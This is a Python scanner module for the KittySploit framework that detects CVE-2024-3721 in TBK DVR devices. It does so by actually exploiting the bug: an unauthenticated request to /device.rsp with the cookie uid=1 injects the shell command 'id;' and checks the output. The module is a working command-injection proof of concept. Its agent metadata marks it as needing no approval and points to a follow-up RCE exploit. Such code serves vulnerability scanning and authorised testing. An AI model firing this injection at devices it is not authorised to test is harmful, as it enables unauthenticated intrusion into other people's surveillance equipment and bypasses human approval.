#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TBK DVR OS command injection via device.rsp (CVE-2024-3721)."""

import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TBK DVR - OS Command Injection Detection (CVE-2024-3721)',
        'description': (
            'TBK DVR devices (and rebrands) allow unauthenticated OS command injection via '
            '/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=<cmd> with Cookie uid=1.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'tbk', 'dvr', 'iot', 'rce', 'cmdi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/tbk_cve_2024_3721_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-3721',
        ],
        'cve': 'CVE-2024-3721',
    }

    def run(self):
        login = self.http_request(method='GET', path='/login.rsp', allow_redirects=False)
        if not login or login.status_code != 200:
            return False

        cmd = quote('id;', safe='')
        path = (
            f'/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc={cmd}'
        )
        r = self.http_request(
            method='GET',
            path=path,
            headers={'Cookie': 'uid=1'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if re.search(r'uid=\d+', body):
            self.set_info(
                severity='critical',
                reason='TBK DVR CVE-2024-3721 OS command injection confirmed',
                path=path,
            )
            return True
        return False
